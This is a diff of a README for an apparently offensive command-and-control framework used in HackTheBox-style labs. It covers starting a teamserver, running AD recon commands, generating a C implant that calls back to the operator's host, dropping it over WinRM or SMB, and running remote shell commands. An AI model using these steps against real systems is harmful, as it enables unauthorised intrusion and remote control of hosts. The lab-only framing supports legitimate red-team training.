@@ -162,56 +162,104 @@ Support, Logging, Ghostlink, DanglingTree. Notes under `reports/htb-*/`. Skills:
 
 ---
 
-## Quick start
+## How to use
 
-Needs Go 1.22+ (repo is on 1.25), `make`, and `protoc` for proto regen. C PE: mingw or `scripts/setup_c_toolchain.sh`.
+Authorized lab only. Needs Go 1.22+ (repo is on 1.25) and `make`. C PE: mingw or `scripts/setup_c_toolchain.sh`.
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+**1 · Build**
 
 ```bash
 make erebus
-# keep C2 up (this is the lab default)
-./build/erebus teamserver
+# optional: make install   →  ~/.local/bin/erebus
+```
 
+</td>
+<td width="50%" valign="top">
+
+**2 · Start C2**
+
+```bash
+./build/erebus teamserver
+```
+
+Leave this terminal open. Do **not** use `erebus serve` in a pipe — closing stdin stops C2.
+
+Fresh config listens on **443**. Many labs use **8443** in `~/.erebus/server.yaml`.
+
+</td>
+</tr>
+<tr>
+<td width="50%" valign="top">
+
+**3 · Seats + operator**
+
+```bash
 # other terminal
 ./build/erebus certs seats
 ./build/erebus operator
 ```
 
-```bash
-make install          # ~/.local/bin/erebus
-erebus                # console
-erebus help
-```
+Or one-shots: `erebus op sessions`. Dual certs (`operator` + `approver`) are how high-risk tasks get approved.
 
-### Implant
+</td>
+<td width="50%" valign="top">
 
-```bash
-# Operator (registers the PSK)
-erebus op generate --os windows --language c \
-  --callback https://<tun0>:8443 --out implant.exe
+**4 · Host recon first**
 
-# Makefile (then: erebus op register-secret <id> <hex>)
-make implant-c CALLBACK_URL=https://<tun0>:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
-
-make implant-c-linux CALLBACK_URL=https://<tun0>:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
-```
-
-Interactive lab: low sleep is fine. Kill the implant when you leave.
-
-### Host-side (no beacon)
+No implant yet. Secrets go in files (`--pass-file`), never bash `"…$…"`.
 
 ```bash
 erebus smb shares --host <DC> --anon
-erebus ldap enum --dc <DC> --domain DOM --user u --pass-file ./p --type interesting
-erebus ldap dangling --dc <DC> --domain DOM --user u --pass-file ./p
-erebus ad password --dc <DC> --domain DOM --user u --pass-file ./p \
-  --target t --new-pass-file ./n --yes
+erebus ldap enum --dc <DC> --domain DOM \
+  --user u --pass-file ./p --type interesting
+erebus ldap dangling --dc <DC> --domain DOM \
+  --user u --pass-file ./p
 erebus kerberos skew --dc <DC>
-erebus kerberos with-skew --dc <DC> -- certipy auth -pfx admin.pfx -dc-ip <DC>
 ```
 
-Secrets with `$` go in files (`--pass-file`). Do not put them in bash double quotes.
+</td>
+</tr>
+<tr>
+<td width="50%" valign="top">
+
+**5 · Build an implant**
+
+Callback must be reachable from the target (`tun0` on HTB). `op generate` registers the PSK.
+
+```bash
+erebus op generate --os windows --language c \
+  --callback https://<you>:8443 --out implant.exe
+```
+
+Linux peer: `--os linux`. Makefile path: `make implant-c` / `implant-c-linux`, then `erebus op register-secret`.
+
+</td>
+<td width="50%" valign="top">
+
+**6 · Session**
+
+Drop the binary (WinRM/SMB/ATSVC — WinRM is often filtered). Then:
+
+```text
+erebus op sessions
+erebus op shell -- whoami
+```
+
+In the REPL: `sessions` → `use <id>` → `shell whoami`.
+
+High-risk tasks sit in `pending` until the **approver** seat runs `approve <id>`.
+
+</td>
+</tr>
+</table>
+
+**Leave clean.** Kill the implant, stop `teamserver`, do not leave listeners or lab artifacts on a reused box.
+
+More: [AD cookbook](docs/AD_ENGAGEMENT.md) · [host tools](docs/OPERATOR_PRE_IMPLANT.md) · [inbound / 404 reasons](docs/OPERATOR_INBOUND.md).
 
 ---
 
